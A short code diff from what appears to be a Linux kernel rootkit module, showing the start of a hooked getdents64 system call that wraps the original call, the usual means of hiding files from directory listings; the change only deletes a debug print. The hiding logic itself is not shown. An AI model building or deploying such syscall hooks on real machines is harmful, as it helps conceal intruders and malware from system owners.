@@ -29,7 +29,6 @@ asmlinkage int
 hooked_getdents64(int fd,
                 struct linux_dirent64 *dirp,
                 unsigned int count) {
-  printk(KERN_INFO "Should not be here\n");
   /* Calls the original system call. */
   int ret = og_getdents64(fd, dirp, count), err;
   unsigned long cpt = 0;
